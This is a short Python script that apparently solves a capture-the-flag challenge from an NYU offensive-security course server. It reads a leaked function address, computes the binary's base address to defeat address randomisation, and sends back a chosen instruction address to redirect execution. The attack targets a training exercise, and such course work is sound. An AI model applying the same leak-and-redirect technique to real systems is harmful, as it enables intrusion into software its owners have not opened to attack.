import socket
import struct

def recv_until(s, delimiter):
    data = b""
    while not data.endswith(delimiter):
        data += s.recv(1)
    return data


def connect_and_solve():
    host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
    port = 1245

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    netid_prompt = recv_until(s, b'Please input your NetID (something like abc123): ')
    print(netid_prompt.decode())

    s.sendall(b'vc2499\n')

    post_it_note = recv_until(s, b'I found the raw bytes address of `totally_uninteresting_function` written somewhere:')
    print(post_it_note.decode())


    fake_vault_address_raw = s.recv(6)
    print(f"Raw address received: {fake_vault_address_raw}")

    fake_vault_padded_address = fake_vault_address_raw.ljust(8, b'\x00')

    tuf_offset = 0x1249
    add_offset = 0x1285 


    base_address = struct.unpack("<Q", fake_vault_padded_address)[0] - tuf_offset

    add_address = base_address + add_offset
    print(f"Base address: {hex(base_address)}")
    print(f"ADD instruction address: {hex(add_address)}")

    add_address_bytes = struct.pack("<Q", add_address)[:6]

    print(f"Sending raw address bytes: {add_address_bytes}")

    s.sendall(add_address_bytes)

    response = s.recv(1024)
    print(response.decode())

    s.close()

if __name__ == "__main__":
    connect_and_solve()
